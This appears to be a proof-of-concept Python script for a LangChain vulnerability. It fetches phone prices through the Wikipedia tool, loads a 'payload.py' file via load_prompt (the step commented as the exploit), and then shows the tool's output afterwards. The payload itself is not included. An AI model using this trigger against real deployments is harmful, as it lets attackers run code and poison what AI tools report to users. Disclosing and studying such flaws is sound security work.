import re

# required by exploit
from langchain.prompts import load_prompt

# will be exploited
from langchain.tools import WikipediaQueryRun
from langchain.utilities import WikipediaAPIWrapper

#
# pre-exploit
#
print('pre-exploit')

# tool `wikipedia` is not exploited at this moment
wikipedia = WikipediaQueryRun(api_wrapper=WikipediaAPIWrapper())

iphone_res = wikipedia.run('Apple_IPhone_14')
iphone_res = iphone_res[:iphone_res.find('Page:', len('Page:'))]
# print(iphone_res)
print('Apple_IPhone_14', re.findall(r"\$\d+", iphone_res))

samsung_res = wikipedia.run('Samsung_Galaxy_S22')
samsung_res = samsung_res[:samsung_res.find('Page:', len('Page:'))]
# print(samsung_res)
print('Samsung_Galaxy_S22', re.findall(r"\$\d+", samsung_res))
print('-' * 32)

#
# exploit in `payload.py`
#
load_prompt('payload.py')

#
# post-exploit
#
print('post-exploit')

# use exploited tool `wikipedia`
# tool `wikipedia` is not exploited at this moment
wikipedia = WikipediaQueryRun(api_wrapper=WikipediaAPIWrapper())

iphone_res = wikipedia.run('Apple_IPhone_14')
iphone_res = iphone_res[:iphone_res.find('Page:', len('Page:'))]
# print(iphone_res)
print('Apple_IPhone_14', re.findall(r"\$\d+", iphone_res))

samsung_res = wikipedia.run('Samsung_Galaxy_S22')
samsung_res = samsung_res[:samsung_res.find('Page:', len('Page:'))]
# print(samsung_res)
print('Samsung_Galaxy_S22', re.findall(r"\$\d+", samsung_res))